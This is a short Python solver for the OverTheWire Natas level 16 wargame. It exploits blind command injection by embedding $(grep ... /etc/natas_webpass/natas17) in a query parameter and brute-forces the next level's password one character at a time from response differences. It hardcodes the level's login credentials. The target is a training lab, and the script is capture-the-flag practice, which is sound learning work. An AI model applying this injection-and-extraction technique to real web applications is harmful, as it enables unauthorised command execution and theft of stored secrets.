import requests 
import string 
  
charset = ''.join(sorted(string.digits + string.ascii_letters))
neededchars = ''
password = ''

for c in charset:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Englished$(grep ' + c + ' /etc/natas_webpass/natas17)', auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
 
    #print(r.text)
    if( 'Englished' not in r.text):
        neededchars = neededchars + c

print(neededchars)
for i in range(32):  
 for char in neededchars:  
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + password + char + ' /etc/natas_webpass/natas17)', auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))  
    
  if 'doomed' not in r.text:  
   password = password + char  
   print(password)  
   break  

print(password)